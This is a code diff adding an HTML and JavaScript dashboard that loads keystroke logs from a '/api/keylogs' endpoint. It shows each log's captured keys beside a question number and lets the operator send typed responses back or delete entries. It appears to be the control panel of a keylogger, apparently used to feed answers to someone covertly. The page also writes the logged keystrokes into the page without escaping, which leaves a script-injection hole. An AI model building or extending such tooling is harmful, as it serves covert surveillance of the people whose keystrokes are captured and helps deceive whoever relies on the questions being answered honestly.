@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard</title>
+    <link rel="stylesheet" href="dashboard.css">
+    <style>
+       @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
+
+body {
+    font-family: 'Orbitron', sans-serif;
+    margin: 0;
+    padding: 0;
+    background: linear-gradient(145deg, #0f0f0f, #1a1a1a);
+    color: #ffffff;
+    display: flex;
+    justify-content: center;
+    min-height: 100vh;
+}
+
+.container {
+    width: 100%;
+    max-width: 90vw;
+    margin: 30px auto;
+    padding: 20px;
+    background: rgba(255, 255, 255, 0.02);
+    backdrop-filter: blur(20px);
+    border-radius: 16px;
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: space-between;
+    gap: 24px;
+    box-shadow: 0 0 30px rgba(0, 255, 255, 0.1);
+}
+
+.question-container {
+    position: relative;
+    padding: 20px;
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 12px;
+    width: calc(50% - 12px);
+    box-sizing: border-box;
+    background: linear-gradient(135deg, rgba(0, 0, 0, 0.6), rgba(30, 30, 30, 0.8));
+    height: 350px;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    transition: all 0.3s ease-in-out;
+    box-shadow: 0 0 20px rgba(0, 255, 255, 0.05);
+}
+
+.question-container:hover {
+    transform: scale(1.02);
+    box-shadow: 0 0 40px rgba(0, 255, 255, 0.2);
+}
+
+.question-number {
+    position: absolute;
+    top: 10px;
+    left: 10px;
+    background: linear-gradient(145deg, #00f6ff, #5c62f2);
+    color: white;
+    padding: 10px 16px;
+    border-radius: 6px; /* slight rounding, remove completely if needed */
+    font-weight: bold;
+    font-size: 16px;
+    z-index: 2;
+    box-shadow: 0 0 12px rgba(0, 255, 255, 0.4);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+}
+
+.logged-keys {
+     margin-left: 60px; /* push to the right of the question number */
+    margin-top: 20px;  /* push content below the question number */
+    padding: 12px;
+    background: rgba(0, 0, 0, 0.4);
+    color: #0ff;
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 10px;
+    height: 150px;
+    overflow-y: auto;
+    white-space: normal;
+    box-sizing: border-box;
+    font-size: 14px;
+    position: relative;
+    z-index: 1;
+}
+
+textarea {
+    width: 100%;
+    height: 80px;
+    border: 1px solid rgba(0, 255, 255, 0.3);
+    border-radius: 8px;
+    padding: 10px;
+    resize: none;
+    overflow-y: auto;
+    box-sizing: border-box;
+    background: rgba(0, 0, 0, 0.4);
+    color: #fff;
+    font-family: 'Orbitron', sans-serif;
+}
+
+.button-container {
+    display: flex;
+    justify-content: space-between;
+    gap: 10px;
+    margin-top: 10px;
+    flex-wrap: wrap;
+}
+
+/* Base futuristic button style */
+.button-shared {
+    all: unset;
+    min-width: 100px;
+    height: 35px;
+    font-size: 14px;
+    padding: 10px 16px;
+    background: linear-gradient(135deg, rgba(0, 255, 255, 0.3), rgba(92, 98, 242, 0.3));
+    border: 1px solid rgba(0, 255, 255, 0.4);
+    border-radius: 10px;
+    color: #fff;
+    text-align: center;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    position: relative;
+    overflow: hidden;
+    z-index: 1;
+}
+
+.button-shared::before {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: -50%;
+    width: 200%;
+    height: 200%;
+    background: radial-gradient(circle, rgba(255,255,255,0.15) 10%, transparent 70%);
+    opacity: 0;
+    transition: opacity 0.5s ease;
+    z-index: 0;
+}
+
+.button-shared:hover::before {
+    opacity: 1;
+}
+
+.button-shared:hover {
+    background: linear-gradient(135deg, rgba(0, 255, 255, 0.6), rgba(92, 98, 242, 0.6));
+    transform: scale(1.03);
+    box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
+}
+
+.send-response {
+    color: #00ffae;
+    border-color: #00ffae;
+}
+
+.delete-question {
+    color: #ff4d4d;
+    border-color: #ff4d4d;
+}
+
+.delete-response {
+    color: #0099ff;
+    border-color: #0099ff;
+}
+
+/* Blood drop effect (unchanged) */
+.blood-drop {
+    position: absolute;
+    width: 8px;
+    height: 8px;
+    background-color: red;
+    border-radius: 50%;
+    animation: fall 3s linear forwards;
+    pointer-events: none;
+}
+
+@keyframes fall {
+    0% {
+        transform: translateY(0);
+        opacity: 1;
+    }
+    100% {
+        transform: translateY(100vh);
+        opacity: 0;
+    }
+}
+
+    </style>
+</head>
+<body>
+    <div class="container" id="dashboard">
+        <!-- Keylogs will be dynamically loaded here -->
+    </div>
+
+    <!-- Audio elements -->
+    <audio id="send-audio" src="/audio/send"></audio>
+    <audio id="delete-question-audio" src="/audio/delete-question"></audio>
+    <audio id="delete-response-audio" src="/audio/delete-response"></audio>
+    <audio id="error-audio" src="/audio/error"></audio>
+    <audio id="login-audio" src="/audio/login"></audio>
+
+    <script>
+        const dashboard = document.getElementById('dashboard');
+
+        // Play login sound when dashboard loads
+window.addEventListener('DOMContentLoaded', () => {
+    const loginAudio = document.getElementById('login-audio');
+    if (loginAudio) {
+        loginAudio.play().catch(err => {
+            console.warn('Login audio failed to play:', err);
+        });
+    }
+        // Fetch and display keylogs
+        async function fetchKeylogs() {
+            const response = await fetch('/api/keylogs');
+            const keylogs = await response.json();
+
+            for (const keylog of keylogs) {
+                const div = document.createElement('div');
+                div.className = 'question-container';
+                div.innerHTML = `
+                    <div class="question-number">${keylog.questionNumber}</div>
+                    <div class="logged-keys">${keylog.loggedKeys}</div>
+                    <textarea placeholder="Type your response here..."></textarea>
+                    <div class="button-container">
+                        <button class="button-shared send-response" data-id="${keylog._id}" data-question="${keylog.questionNumber}">Send Response</button>
+                        <button class="button-shared delete-question" data-id="${keylog._id}">Delete Question</button>
+                        <button class="button-shared delete-response" data-id="${keylog._id}">Delete Response</button>
+                    </div>
+                `;
+                dashboard.appendChild(div);
+            }
+        }
+
+        // Event delegation for buttons
+        dashboard.addEventListener('click', async (e) => {
+            const target = e.target;
+            const id = target.dataset.id;
+            const questionNumber = target.dataset.question;
+
+            if (target.classList.contains('send-response')) {
+              
+                const textarea = target.closest('.question-container').querySelector('textarea');
+                const response = textarea.value.trim();
+                const keylogId = target.dataset.id;
+
+                if (!response) {
+                document.getElementById('error-audio').play(); // 🔊 Play error audio
+                    alert('Please enter a response.');
+                    return;
+                }
+
+                try {
+                    const res = await fetch('/api/keylogs/responses', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ questionNumber, response, keylogId }),
+                    });
+
+                    if (res.ok) {
+                          // 🔊 Play send audio
+                document.getElementById('send-audio').play();
+
+                        const data = await res.json();
+                        alert('Response sent successfully.');
+                        textarea.value = '';
+                    } else {
+                        const errorData = await res.json();
+                        alert('Failed to send response: ' + (errorData.message || 'Unknown error'));
+                        document.getElementById('error-audio').play(); // 🔊 Play error audio
+                    }
+                } catch (err) {
+    document.getElementById('error-audio').play(); // 🔊 Play error audio
+    alert('Error occurred while sending response: ' + err.message);                }
+            }
+
+            if (target.classList.contains('delete-response')) {
+              
+                try {
+                    const response = await fetch(`/api/keylogs/responses/${id}`, { method: 'DELETE' });
+                    const result = await response.json();
+
+                    if (response.ok) {
+                          // 🔊 Play delete response audio
+                document.getElementById('delete-response-audio').play();
+                        alert(result.message);
+                    } else {
+                        alert(result.error || 'Failed to delete response');
+                        document.getElementById('error-audio').play(); // 🔊 Play error audio
+                    }
+                } catch (error) {
+                    alert('An error occurred while trying to delete the response.');
+                    document.getElementById('error-audio').play(); // 🔊 Play error audio
+                }
+            }
+
+            if (target.classList.contains('delete-question')) {
+               
+
+                try {
+                    const response = await fetch(`/api/keylogs/${id}`, { method: 'DELETE' });
+                    const result = await response.json();
+
+                    if (response.ok) {
+                         // 🔊 Play delete question audio
+                document.getElementById('delete-question-audio').play();
+                        alert(result.message);
+                        target.closest('.question-container').remove();
+                    } else {
+                        alert(result.error || 'Failed to delete question');
+                         document.getElementById('error-audio').play(); // 🔊 Play error audio
+                    }
+                } catch (error) {
+                    alert('An error occurred while trying to delete the question.');
+                    document.getElementById('error-audio').play(); // 🔊 Play error audio
+
+                }
+            }
+        });
+
+        // Fetch keylogs on page load
+        fetchKeylogs();
+
+        // Floating blood drop effect
+        const body = document.body;
+        document.addEventListener('mousemove', (e) => {
+            const drop = document.createElement('div');
+            drop.classList.add('blood-drop');
+
+            const size = Math.random() * 6 + 4;
+            const drift = (Math.random() - 0.5) * 50;
+            const duration = Math.random() * 2 + 1;
+
+            drop.style.width = `${size}px`;
+            drop.style.height = `${size}px`;
+            drop.style.left = `${e.pageX + drift}px`;
+            drop.style.top = `${e.pageY}px`;
+            drop.style.animationDuration = `${duration}s`;
+
+            body.appendChild(drop);
+            drop.addEventListener('animationend', () => {
+                drop.remove();
+            });
+        });
+
+        });
+
+    </script>
+</body>
+</html>
